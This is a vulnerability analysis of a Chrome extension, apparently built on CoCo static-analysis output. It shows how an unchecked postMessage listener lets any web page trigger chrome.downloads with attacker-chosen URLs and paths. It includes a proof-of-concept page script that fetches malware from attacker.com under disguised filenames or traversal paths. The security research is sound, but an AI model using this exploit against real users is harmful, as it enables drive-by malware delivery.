# CoCo Analysis: emiplbkkiabideffmpogkbbogkmofgph

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10 (multiple flows to same sink - consolidated)

---

## Sink: cs_window_eventListener_message → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/emiplbkkiabideffmpogkbbogkmofgph/opgen_generated_files/cs_0.js
Line 477	window.addEventListener("message", function(event) {
Line 481	if (event.data.type && (event.data.type == "HTCOMNET_CHECK_EXT"))
Line 486	port.postMessage({files : event.data.files});

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/emiplbkkiabideffmpogkbbogkmofgph/opgen_generated_files/bg.js
Line 983	chrome.downloads.download({url:filesList[i].url, filename:filesList[i].path}
Line 999	chrome.downloads.download({url:dItem.url, filename: dItem.path});

**Code:**

```javascript
// Content script - Entry point (cs_0.js, line 471-489)
var htcomnetVersion = document.getElementById("httpcommander_version");
if (htcomnetVersion) {  // ← Attacker can inject this element!
  var port = chrome.runtime.connect();

  window.addEventListener("message", function(event) {
    if (event.source != window)
      return;

    if (event.data.type && (event.data.type == "HTCOMNET_DOWNLOAD")) {
      console.log("Content script received: " + event.data.type);
      port.postMessage({files : event.data.files});  // ← attacker-controlled files array
    }
  }, false);
}

// Background script - Message handler (bg.js, line 976-1006)
port.onMessage.addListener(function(msg) {
  if (msg.files) {
    filesList = msg.files;  // ← attacker-controlled array

    if (!options.downloadByOne)
      for (var i = 0; i < filesList.length; i++)
        chrome.downloads.download({
          url: filesList[i].url,        // ← attacker-controlled URL
          filename: filesList[i].path   // ← attacker-controlled path
        });
    downloadNextFile();
  }
});

function downloadNextFile() {
  if (filesList.length > 0) {
    dItem = filesList.shift();
    if (options.downloadByOne)
      chrome.downloads.download({
        url: dItem.url,      // ← attacker-controlled URL
        filename: dItem.path // ← attacker-controlled path
      });
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage - DOM element check can be bypassed

**Attack:**

```javascript
// From malicious webpage - inject the required element first
var elem = document.createElement('div');
elem.id = 'httpcommander_version';
document.body.appendChild(elem);

// Wait for content script to initialize (or reload page)
// Then trigger arbitrary downloads
window.postMessage({
  type: "HTCOMNET_DOWNLOAD",
  files: [
    {
      url: "https://attacker.com/malware.exe",
      path: "Downloads/legitimate-looking-file.exe"
    },
    {
      url: "https://attacker.com/trojan.pdf",
      path: "Documents/important-document.pdf"
    }
  ]
}, "*");

// Or download to overwrite system files (if Chrome allows):
window.postMessage({
  type: "HTCOMNET_DOWNLOAD",
  files: [
    {
      url: "https://attacker.com/malicious-script.js",
      path: "../../../malicious.js"
    }
  ]
}, "*");
```

**Impact:** Arbitrary file downloads with attacker-controlled URLs and filenames. An attacker can trigger the extension to download malicious files from any URL to any path the user has write access to. This can be used to deliver malware, trojans, or other malicious payloads. The filename is also attacker-controlled, allowing for social engineering (e.g., naming malware as "important-document.pdf"). The extension has "downloads" permission in manifest.json, making this attack fully exploitable.
